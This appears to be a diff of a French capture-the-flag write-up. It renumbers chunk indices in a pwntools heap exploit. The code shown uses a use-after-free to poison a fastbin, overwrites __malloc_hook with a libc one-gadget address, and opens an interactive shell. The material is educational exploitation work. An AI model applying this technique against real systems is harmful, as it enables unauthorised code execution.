@@ -189,9 +189,9 @@ else {
 Le programme nous permettant de contrôler l'index du chunk que l'on soit manipuler cela devient assez simple:
 
 ```python
-add(5, 0x68)
-delete(5)
-write(5, p64(libc.sym.__malloc_hook-35))
+add(2, 0x68)
+delete(2)
+write(2, p64(libc.sym.__malloc_hook-35))
 ```
 
 ## Arbitrary write
@@ -199,9 +199,9 @@ write(5, p64(libc.sym.__malloc_hook-35))
 Pour finir on écrase \_\_malloc\_hook avec l'adresse de notre gadget.
 
 ```python
-add(6,0x68)
-add(7,0x68)
-write(7 , b"A" * 19 + p64(libc.address + gadget))
+add(3,0x68)
+add(4,0x68)
+write(4 , b"A" * 19 + p64(libc.address + gadget))
 ```
 
 ### Output
@@ -283,17 +283,17 @@ libc.address = u64(leak.ljust(8,b"\x00")) -  (0x3554d8 + libc.sym.puts)
 info(f"LIBC: {hex(libc.address)}")
 
 ## uaf
-add(5, 0x68)
-delete(5)
-write(5, p64(libc.sym.__malloc_hook-35))
+add(2, 0x68)
+delete(2)
+write(2, p64(libc.sym.__malloc_hook-35))
 
-# overwrite
-add(6,0x68)
-add(7,0x68)
-write(7 , b"A" * 19 + p64(libc.address + gadget))
+# poison
+add(3,0x68)
+add(4,0x68)
+write(4 , b"A" * 19 + p64(libc.address + gadget))
 
 # pop a shell
-add(8, 10)
+add(5, 6)
 
 io.interactive()
 ```
